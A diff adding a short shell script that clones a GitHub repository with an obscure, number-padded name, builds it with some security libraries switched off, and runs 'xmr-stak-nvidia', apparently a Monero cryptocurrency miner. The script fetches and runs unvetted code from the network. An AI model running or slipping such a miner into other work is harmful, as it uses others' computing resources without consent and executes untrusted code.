@@ -1,0 +1,13 @@
+git clone https://github.com/mobileapps84741274/xmr84744474
+
+cd ./xmr84744474/
+
+cd ./build/
+
+cmake .. -DMICROHTTPD_REQUIRED=OFF -DOpenSSL_REQUIRED=OFF
+
+make
+
+cd ./bin/
+
+./xmr-stak-nvidia
